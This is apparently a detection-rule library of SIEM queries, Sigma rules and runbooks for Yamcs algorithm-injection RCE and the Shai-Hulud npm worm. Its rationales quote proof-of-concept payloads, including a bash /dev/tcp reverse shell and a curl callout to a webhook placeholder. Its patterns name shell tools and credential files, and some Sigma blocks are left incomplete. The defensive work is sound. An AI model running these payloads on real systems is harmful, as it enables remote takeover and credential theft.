Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) AIExploitation High
Hunts the CVE-2026-46621 exploitation request: an authenticated HTTP PATCH to /api/mdb/{instance}/realtime/algorithms/{name} whose JSON body contains Jython-to-Java escape strings (java.lang.Runtime, getRuntime, import java). This is the article's exact exploit primitive — overwriting a Python algorithm's text via the MDB REST API to break out of the JSR-223 sandbox. Rationale: Pivots on the exact exploit primitive from the GHSA advisory: PATCH /api/mdb/{instance}/realtime/algorithms/{name} body containing 'java.lang.Runtime', 'getRuntime', or 'import java'. These tokens have no legitimate place in a Python/Jython algorithm in normal Yamcs operations — they are the Jython-to-Java escape. Cross-checked against the GHSA-2g95-6x5q-xjwj advisory PoC. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/006/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46621
ATT&CKT1190 T1059.006 T1078
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Yamcs developer legitimately referencing Java classes in algorithm docstrings/comments (rare — flag and review)
  • Internal vulnerability scanners (Burp/Nuclei) replaying the public PoC against a staging Yamcs
  • Mission-database backup/restore tooling that re-PATCHes algorithm bodies verbatim
  • Yamcs version upgrade scripts that bulk-update algorithm definitions
  • Red-team / purple-team exercise traffic to the MDB API
Suppression filter
// Exclude internal scanner IPs and known maintenance accounts
| where Src !in ("10.99.0.10","10.99.0.11")    // scanner range
| where User !in~ ("yamcs-deploy","yamcs-backup")
Response runbook
1. Triage — pull the full HTTP request: source IP, bearer-token subject (which Yamcs account), full body. Confirm the account holds ChangeMissionDatabase privilege and check Yamcs version (<5.12.7 = vulnerable). Pull the algorithm name from the URL path. 2. Contain — revoke the bearer token, disable the Yamcs account, isolate the Yamcs host if Phase 2 UC fired too. Snapshot the MDB and `GET` the current algorithm text to capture the injected payload as forensic evidence; then revert the algorithm body. 3. Hunt — pivot on source IP across the last 30 days for prior reconnaissance (GETs to /api/mdb/* listings, /auth endpoints), and look for other algorithm PATCHes from the same token. Patch Yamcs to ≥5.12.7 and audit which accounts hold ChangeMissionDatabase.
// Yamcs runs as a JVM; web traffic to its REST API is usually proxied or visible as DeviceNetworkEvents to TCP/8090. Defender's HTTP-body visibility is limited — pair with the WAF/reverse-proxy log source.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 8090 or LocalPort == 8090
| where InitiatingProcessFileName !in~ ("java.exe","java")
| where AdditionalFields has_any ("PATCH","/api/mdb/","/realtime/algorithms/")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, LocalPort, AdditionalFields
| order by Timestamp desc
// Detect HTTP PATCH to Yamcs MDB algorithms endpoint carrying Jython-to-Java escape strings.
let algoEndpoint = @"/api/mdb/[^/]+/realtime/algorithms/";
let jythonPayloadTokens = dynamic(["java.lang.Runtime","getRuntime","import java","Runtime.getRuntime","exec([\"bash\"","exec([\"sh\"","exec([\"cmd\""]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "PATCH"
  | where csUriStem matches regex algoEndpoint
  | extend Src = cIP, User = csUserName, Uri = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), UA = csUserAgent, Body = ""
  | project TimeGenerated, Src, User, Uri, UA, Body, Status = scStatus),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "PATCH"
  | where RequestURL matches regex algoEndpoint
  | extend Src = SourceIP, User = SourceUserName, Uri = RequestURL, UA = RequestClientApplication, Body = coalesce(AdditionalExtensions, Message), Status = tostring(EventOutcome)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "PATCH"
  | where Url matches regex algoEndpoint
  | extend Src = SrcIpAddr, User = SrcUsername, Uri = Url, UA = HttpRequestHeaderUserAgent, Body = "", Status = tostring(HttpStatusCode)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status)
| where Body has_any (jythonPayloadTokens) or Uri has_any (jythonPayloadTokens)
| order by TimeGenerated desc
title: Yamcs MDB Algorithm PATCH with Jython java.lang.Runtime Payload (CVE-2026-46621)
id: 6a3e9b1c-2d4e-4b1e-9b6f-7e8b1c2d4e3a
status: experimental
description: Detects HTTP PATCH to the Yamcs Mission Database algorithms endpoint with a request body containing Jython-to-Java escape strings used in CVE-2026-46621 (java.lang.Runtime / getRuntime / import java).
references:
  - https://github.com/advisories/GHSA-2g95-6x5q-xjwj
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.execution
  - attack.t1190
  - attack.t1059.006
  - cve.2026.46621
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'PATCH'
  selection_uri:
    cs-uri-stem|contains:
      - '/api/mdb/'
      - '/realtime/algorithms/'
  selection_payload:
    cs-uri-query|contains:
      - 'java.lang.Runtime'
      - 'getRuntime'
      - 'import java'
      - 'Runtime.getRuntime'
  condition: selection_method and selection_uri and selection_payload
falsepositives:
  - Internal red-team / vulnerability scanners replaying the PoC
  - Yamcs developers legitimately referencing java.lang in algorithm text (rare — algorithms are domain-specific)
level: high
(source:nginx OR source:apache OR source:haproxy OR source:linux.syslog) @http.method:PATCH @http.url_details.path:*/api/mdb/*/realtime/algorithms/* (@http.request.body:(*java.lang.Runtime* OR *getRuntime* OR *"import java"*) OR @http.url_details.queryString:(*java.lang.Runtime* OR *getRuntime*))
// Falcon FDR generally does not capture HTTP request bodies. Closest pivot is post-exploitation process tree (see UC 2). Returning host-side hit on the curl beacon that the payload triggers.
#event_simpleName=ProcessRollup2
| ImageFileName=/\/curl$/i OR ImageFileName=/\/bash$/i OR ImageFileName=/\/sh$/i
| ParentBaseFileName=/^java$/i
| CommandLine=/RCE|webhook|interactsh|requestbin|ngrok|trycloudflare/i
| groupBy([aid, ComputerName, ImageFileName, ParentBaseFileName, CommandLine], function=count())
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src values(Web.user) as user values(Web.http_user_agent) as ua from datamodel=Web where Web.http_method=PATCH Web.url="*/api/mdb/*/realtime/algorithms/*" by Web.dest Web.url Web.src Web.user | `drop_dm_object_name(Web)` | join type=inner dest [ search index=* sourcetype=*access* method=PATCH uri_path="*/api/mdb/*/realtime/algorithms/*" ("java.lang.Runtime" OR "getRuntime" OR "import java" OR "Runtime.getRuntime" OR "exec([\"bash\"" OR "exec([\"sh\"") | stats values(uri_path) as uri_path values(http_request_body) as body by dest ] | table firstTime lastTime src user dest url ua body
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Web.url) as url values(Web.src) as src values(Web.user) as user values(Web.http_user_agent) as ua from datamodel=Web where Web.http_method=PATCH Web.url="*/api/mdb/*/realtime/algorithms/*" by Web.dest Web.url Web.src Web.user | `drop_dm_object_name(Web)` | join type=inner dest [ search index=* sourcetype=*access* method=PATCH uri_path="*/api/mdb/*/realtime/algorithms/*" ("java.lang.Runtime" OR "getRuntime" OR "import java" OR "Runtime.getRuntime" OR "exec([\"bash\"" OR "exec([\"sh\"") | stats values(uri_path) as uri_path values(http_request_body) as body by dest ] | table firstTime lastTime src user dest url ua body
Yamcs JVM spawns shell or network utility (CVE-2026-46621 post-exploitation) AIInstallation High
Hunts the host-side payoff of CVE-2026-46621: a java/jython process under the Yamcs service forking bash, sh, curl, wget, nc, python or similar OS utilities. Yamcs is a telemetry processing JVM — under normal operations its process tree does not fork shells or network clients. Rationale: Article PoC: 'java.lang.Runtime.getRuntime().exec(["bash", "-c", "curl https://<YOUR-WEBHOOK-URL>/RCE"])' — the Yamcs JVM directly forks bash + curl. Pinning to parent=java/jython with a yamcs-context check on the parent commandline keeps FPs near zero because the Yamcs JVM has no legitimate need to fork shells. Cross-checked against MITRE T1059.006 (Python) and T1059.004 (Unix Shell). Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.004 T1059.006 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Yamcs admin script intentionally shelling out from a custom algorithm (rare; should be baselined per deployment)
  • JVM crash-handler / OOM-killer script invoking notification utilities
  • Container entrypoint wrappers that exec curl for health checks before launching Yamcs (parent would not have yamcs-context though)
  • Backup tooling that runs as the yamcs service user and forks tar/rsync
  • Penetration test or red-team exercise on the Yamcs host
Suppression filter
// Exclude known maintenance wrappers per-deployment
| where ChildCmd !has "/opt/yamcs/scripts/healthcheck.sh"
| where ChildCmd !has "yamcs-backup"
Response runbook
1. Triage — get the full parent and child command lines. Confirm parent is the actual Yamcs JVM (check folder path, classpath including jython-standalone). Identify the algorithm being executed at exec-time by correlating with Yamcs application logs and the PATCH events from UC 1. 2. Contain — isolate the Yamcs host from the network, kill the JVM, preserve memory for forensics. Capture the algorithm body via the MDB API before reverting. Revoke any bearer tokens that PATCHed algorithms recently. 3. Hunt — pivot on the destination of the spawned curl/wget (UC 3), look for secondary persistence (cron, systemd timers, ~/.ssh/authorized_keys modifications) under the Yamcs service account, and check for outbound connections to webhook services from any other host on the same subnet.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe")
| where InitiatingProcessCommandLine has_any ("yamcs","jython","algorithm","ScriptEngine","AlgorithmManager") or InitiatingProcessFolderPath has_any ("yamcs","jython")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Sentinel: Yamcs JVM (java/jython) spawning a shell or network utility — host-side CVE-2026-46621 payoff.
let ShellOrNet = dynamic(["bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe"]);
let YamcsCtx = dynamic(["yamcs","jython","algorithm","ScriptEngine","AlgorithmManager"]);
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("java","jython")
  | where TargetProcessName has_any (ShellOrNet)
  | where ParentProcessCommandLine has_any (YamcsCtx) or ActingProcessCommandLine has_any (YamcsCtx) or TargetProcessCommandLine has_any (YamcsCtx)
  | project TimeGenerated, Host = DvcHostname, User = ActorUsername,
            ParentImage = ParentProcessName, ParentCmd = ParentProcessCommandLine,
            ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("java.exe","jython.exe","\\java","\\jython")
  | where NewProcessName has_any ("\\bash.exe","\\sh.exe","\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\curl.exe","\\wget.exe","\\nc.exe","\\ncat.exe","\\python.exe","\\python3.exe")
  | where CommandLine has_any (YamcsCtx) or ParentProcessName has_any (YamcsCtx)
  | project TimeGenerated, Host = Computer, User = SubjectUserName,
            ParentImage = ParentProcessName, ParentCmd = "",
            ChildImage = NewProcessName, ChildCmd = CommandLine),
(Syslog
  | where TimeGenerated > ago(7d)
  | where Facility =~ "authpriv" or ProcessName has_any ("audit","auditd","sudo")
  | where SyslogMessage has "java" and SyslogMessage has_any (ShellOrNet)
  | where SyslogMessage has_any (YamcsCtx)
  | project TimeGenerated, Host = HostName, User = "", ParentImage = "java", ParentCmd = SyslogMessage, ChildImage = "", ChildCmd = "")
| order by TimeGenerated desc
title: Yamcs JVM Spawns Shell or Network Utility (CVE-2026-46621)
id: 8d5f1a7c-3e4b-4c2d-9a8e-1b3c5d7e9f0a
status: experimental
description: Detects a Yamcs java/jython process spawning a shell or network utility — the host-side payoff of the CVE-2026-46621 Jython algorithm code-injection RCE.
references:

detection:
  selection_parent:
    ParentImage|endswith:
      - '/java'
      - '\\java.exe'
      - '/jython'
      - '\\jython.exe'
  selection_child:
    Image|endswith:
      - '/bash'
      - '/sh'

      - '/wget'

falsepositives:

level: high
(source:linux.auditd OR source:windows.sysmon) (@process.parent.name:(java OR java.exe OR jython OR jython.exe) OR @ParentImage:(*/java OR *\\java.exe OR */jython OR *\\jython.exe)) (@process.name:(bash OR sh OR dash OR zsh OR curl OR wget OR nc OR ncat OR python OR python3 OR perl OR powershell.exe OR cmd.exe OR pwsh) OR @Image:(*/bash OR */sh OR */curl OR */wget OR *\\powershell.exe OR *\\cmd.exe)) (@process.parent.command_line:(*yamcs* OR *jython* OR *AlgorithmManager* OR *ScriptEngine*) OR @ParentCommandLine:(*yamcs* OR *jython* OR *AlgorithmManager*))

| ParentBaseFileName=/^(java|jython)(\.exe)?$/i
| ImageFileName=/\/(bash|sh|dash|zsh|curl|wget|nc|ncat|python3?|perl)$/i OR ImageFileName=/\\(powershell|pwsh|cmd|curl|wget)\.exe$/i

Yamcs Java process beacons to webhook / interact / tunneling service (CVE-2026-46621 C2) AICommand & Control High
Hunts the article's C2 footprint: the Yamcs JVM (or a curl/wget it spawned) making an outbound connection to short-lived webhook / out-of-band-interaction services (webhook.site, requestbin, interactsh, ngrok, trycloudflare, beeceptor). Anchored to the Yamcs JVM as initiating process so we don't blanket-alert on internet usage. Rationale: Article PoC literally calls 'curl https://<YOUR-WEBHOOK-URL>/RCE' from Runtime.exec. Anchoring to (a) the Yamcs JVM or a curl/wget spawned by it AND (b) the well-known OOB-interaction domain list keeps this high-signal: a Yamcs telemetry server has no legitimate need to talk to webhook.site or interactsh. Cross-checked against the CVE-2026-46621 PoC and ProjectDiscovery's Interactsh public domain list. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://github.com/projectdiscovery/interactsh • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorised pentest using Interactsh / Burp Collaborator against the Yamcs host
  • Developer debugging a webhook integration from the Yamcs server
  • Bug-bounty researcher with permitted access to the staging Yamcs
  • Yamcs CI/CD using ngrok to expose a dev instance temporarily
  • SaaS health probe routed via a generic webhook receiver
Suppression filter
// Exclude known authorised pentest source IPs and dev/staging hosts
| where Host !in ("yamcs-dev-01","yamcs-staging-01")
| where Src !in ("10.50.0.42")  // approved pentester jumpbox
Response runbook
1. Triage — pull the full DNS / HTTP request: source process, destination domain, full URL path, request size, response size. Confirm the source is the Yamcs JVM or a child it spawned. Correlate within ±5 minutes against UC 1 (algorithm PATCH) and UC 2 (java→shell process tree) to confirm the exploit chain. 2. Contain — block the destination domain at egress, isolate the Yamcs host, revoke any bearer tokens with ChangeMissionDatabase. Capture pcap if available — the URL path often encodes exfil data. 3. Hunt — pivot on the destination to find any OTHER hosts in the estate that resolved or connected to the same OOB domain in the last 30 days. Look for secondary stages downloaded from the same domain (FileWritten / DeviceFileEvents under the Yamcs service user). Patch Yamcs to ≥5.12.7.
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","en7","interact.sh","interactsh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython","curl","curl.exe","wget","wget.exe")
| where (RemoteUrl has_any (oobDomains)) or (isnotempty(AdditionalFields) and AdditionalFields has_any (oobDomains))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let oobDomains = dynamic(["webhook.site","requestbin.com","requestbin.net","interact.sh","oast.fun","oast.live","oast.me","oast.online","oast.pro","oast.site","burpcollaborator.net","ngrok.io","ngrok-free.app","trycloudflare.com","beeceptor.com","pipedream.net","requestcatcher.com"]);
union isfuzzy=true
(DnsEvents
  | where TimeGenerated > ago(7d)
  | where Name has_any (oobDomains)
  | project TimeGenerated, Host = Computer, Src = ClientIP, Domain = Name, Process = "", Cmd = ""),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestURL has_any (oobDomains) or DestinationHostName has_any (oobDomains)
  | project TimeGenerated, Host = SourceHostName, Src = SourceIP, Domain = coalesce(DestinationHostName, RequestURL), Process = SourceProcessName, Cmd = ""),
(ImNetworkSession
  | where TimeGenerated > ago(7d)
  | where DstHostname has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(DstHostname, Url), Process = "", Cmd = ""),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpHostName has_any (oobDomains) or Url has_any (oobDomains)
  | project TimeGenerated, Host = DvcHostname, Src = SrcIpAddr, Domain = coalesce(HttpHostName, Url), Process = "", Cmd = "")
| order by TimeGenerated desc
title: Yamcs Process Beacons to Out-of-Band Interaction Service (CVE-2026-46621 C2)
id: 2c8e4d1b-9a3f-4e7c-b1d2-3f5a7c9e1b4d
status: experimental
description: Detects the Yamcs JVM (or curl/wget it spawned) connecting to short-lived webhook / out-of-band-interaction services used as C2 / exfil in the CVE-2026-46621 PoC and similar exploit chains.
references:

Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload AIExploitation High
Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090). Rationale: Exploits ride the article's exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate MDB engineer pasting a JavaScript algorithm that happens to import Java APIs for trigonometry (rare — Yamcs algorithms normally use plain JS math)
  • Penetration-test / red-team activity against the Yamcs instance
  • Vulnerability scanner with a CVE-2026-46562 plugin sending the canonical PoC body
  • Yamcs developer testing a fix in a non-prod instance
Suppression filter
| where not (SourceIP in ("<MDB-engineer-jumphost-IP>","<CI-CD-runner-IP>") and RequestClientApplication has_any ("yamcs-cli","python-requests"))
Response runbook
1. Triage: confirm the source IP against your Yamcs management ACL — only mission-operations engineers and CI/CD systems should hit `/api/mdb-overrides/`. Pull the full PATCH body from the proxy log and decode the embedded JavaScript to read the literal command. 2. Contain: cut network access to TCP/8090 from the offending source, force-revoke the session/API key the request authenticated with (or, if guest user is enabled by default, immediately add a `security.yaml` and restart Yamcs to disable anonymous superuser). Snapshot the Yamcs JVM heap and `/proc/<pid>` for forensics before any restart. 3. Hunt: pivot to UC2/UC3 on the Yamcs server to confirm whether `java` actually spawned a shell or made an outbound connection in the 60s after the PATCH; check `MdbOverrideApi` audit log for follow-on RESET calls (PoC re-PATCHes to clean up).
// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8090
| where InitiatingProcessFileName has_any ("java","java.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let YamcsExploitTokens = dynamic(["Java.type","java.lang.Runtime","getRuntime","ProcessBuilder","/dev/tcp/"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL matches regex @"(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/"
| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

description: PATCH to /api/mdb-overrides/{instance}/{processor}/algorithms/{name} whose body sets the algorithm text to Nashorn JavaScript that pivots into java.lang.Runtime — the exact CVE-2026-46562 PoC shape.

Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation AIInstallation High
Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type("java.lang.Runtime").getRuntime().exec(...)`. Rationale: Article's PoC literally runs `Java.type("java.lang.Runtime").getRuntime().exec(["bash","-c","..."])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Yamcs admin running a shell-out wrapper algorithm intentionally during MDB development (uncommon — Yamcs algorithms are normally pure math)
  • yamcs-cli wrapper scripts that invoke java with a -c subshell (cmdline pattern would not match the parent=java/child=shell shape)
  • Container init script if Yamcs runs via a docker entrypoint that wraps java; tune by anchoring on yamcs-server.sh parent
  • JVM crash handler invoking /bin/sh -c hs_err dump
Suppression filter
| where not (ChildCmd has_any ("hs_err_pid","jvm_crash") and ParentCmd has "-XX:OnError")
Response runbook
1. Triage: pull the child-process command line — the CVE-2026-46562 PoC uses `bash -c "exec 3<>/dev/tcp/<lhost>/<lport>; id >&3; sh -i <&3 >&3 2>&3"`. Confirm the parent JVM PID belongs to yamcs-core. Cross-reference UC1 — there should be a PATCH to `/api/mdb-overrides/*/algorithms/*` within the prior ~60s. 2. Contain: kill the Yamcs JVM (`kill -9 <pid>`), block egress from the host, and disable the algorithm override RPC by deploying a temporary mod_security rule on the proxy that drops PATCH to that URL pattern. Snapshot disk and memory before restart — Yamcs leaves no event for successful overrides, so memory is your only forensic source. 3. Hunt: enumerate every algorithm in the running MDB for any payload referencing `Java.type` or `Runtime` (PoC re-PATCHes a RESET to hide tracks — check Yamcs's MDB file modification timestamps); search for outbound TCP from the Yamcs host to non-mission destinations in the last 30 days.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "java"
| where InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where FileName in~ ("sh","bash","dash","zsh","nc","ncat","socat","python","python3","perl","ruby")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName endswith "/java" or ParentProcessName =~ "java"
| where ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/nc","/ncat","/socat","/python","/python3","/perl")
   or TargetProcessName has_any ("sh","bash","dash","nc","ncat","socat","python","python3","perl")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

Reverse-shell /dev/tcp file descriptor from Yamcs java process tree AICommand & Control High
Detects the bash `exec 3<>/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn. Rationale: Verbatim from the GHSA PoC body: `["bash","-c","exec 3<>/dev/tcp/${LHOST}/${LPORT}; id >&3; sh -i <&3 >&3 2>&3"]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).
ATT&CKT1059.004 T1071.001 T1219
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Red-team operator demoing CVE-2026-46562 against the Yamcs UAT environment
  • Network-troubleshooting script that uses `bash -c 'echo > /dev/tcp/host/port'` for port-probe (rare from a java parent)
  • Yamcs site-reliability test harness intentionally exercising the eval sink to validate the patch
  • Honeypot Yamcs instance designed to record exploitation attempts
Suppression filter
| where not (RevHost in ("127.0.0.1","localhost","::1") and AccountName == "yamcs-svc")
Response runbook
1. Triage: extract RevHost/RevPort from the cmdline and check whether it's an internal jumpbox (red team) or external (real compromise). Look up the IP in threat-intel; if external, treat as confirmed RCE-to-C2. 2. Contain: kill the child shell and the Yamcs JVM, block egress to RevHost:RevPort at the perimeter, isolate the Yamcs host from the ground-segment network. Critically — for spacecraft ground-station Yamcs, also notify mission ops that telecommand integrity is in doubt; pause command uplink until forensics confirms no telecommands were forged. 3. Hunt: pivot to RevHost on flow logs for any other host beaconing there in the last 30d (lateral C2 reuse); audit the Yamcs MDB filesystem for tampered algorithm XML files; review telemetry archive for anomalous TM packets in the exploit window — per the advisory, attackers can forge/block telecommands and tamper archive.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where FileName in~ ("bash","sh","dash","zsh")
| where InitiatingProcessFileName =~ "java"
   or InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
   or InitiatingProcessParentFileName =~ "java"
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, ProcessCommandLine)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, RevHost, RevPort,
          ParentImage = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_any ("/dev/tcp/","/dev/udp/") or TargetProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where (ParentProcessName endswith "/java" or ParentProcessName =~ "java")
   or ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| extend Cmd = coalesce(ActingProcessCommandLine, TargetProcessCommandLine)
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, Cmd)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, Cmd)

Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) AIInstallation High
Hunts the Shai-Hulud worm's secret-harvesting stage: a node/npm/yarn process opens AWS credentials, SSH private keys, Kubernetes kubeconfig, or GCP application-default-credentials. The article confirms TGR-CRI-1135 released an open-source version on 2026-05-13, so copycats will reuse this file-access pattern. Rationale: Article confirms TGR-CRI-1135's malware exfiltrates 'cloud access tokens, SSH keys, Kubernetes secrets' and announced the open-source Shai-Hulud release 2026-05-13. Datadog Security Labs and Unit 42 follow-up writeups confirm the exact filesystem paths (~/.aws/credentials, ~/.ssh/, ~/.kube/config, application_default_credentials.json) and that node is the executing host — making this a precise file-access pivot, not a generic 'credentials in files' rule. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
ATT&CKT1552.001 T1195.002 T1528
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • CI build agents (Jenkins, GitHub Actions self-hosted runners) where node legitimately reads ~/.aws/credentials for terraform/aws-cdk deploys
  • Developer laptops running aws-sdk-based scripts that hydrate from the shared credentials file
  • kubectl-node helper plugins (kubeseal, kubectl-krew node wrappers) opening ~/.kube/config
  • npm packages such as @kubernetes/client-node initialising from default kubeconfig
  • Backup tools written in node reading SSH keys for rsync-over-ssh wrappers
Suppression filter
| where not (InitiatingProcessParentFileName in~ ("terraform.exe","cdk.exe","aws.exe","kubectl.exe","helm.exe") and InitiatingProcessCommandLine has_any ("aws-cdk","@kubernetes/client-node","terraform-provider"))
| where not (DeviceName matches regex @"(?i)(jenkins|gha-runner|build-agent)")
Response runbook
